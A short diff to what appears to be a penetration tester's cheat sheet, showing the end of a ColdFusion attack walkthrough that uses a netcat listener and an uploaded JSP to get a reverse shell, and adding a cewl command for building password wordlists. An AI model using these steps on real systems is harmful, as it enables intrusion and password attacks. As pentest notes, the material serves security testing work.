@@ -444,3 +444,10 @@ https://www.carnal0wnage.com/papers/LARES-ColdFusion.pdf
 10. Setup your netcat listener nc -nvlp 32115
 11. Navigate to http://targetsite/CFIDE/x.jsp execute your reverse_tcp
 ```
+
+### Using cewl to generate wordlists
+https://tools.kali.org/password-attacks/cewl
+
+```
+cewl -w wordlist.txt -d 2 -m <IP_ADDRESS>
+```
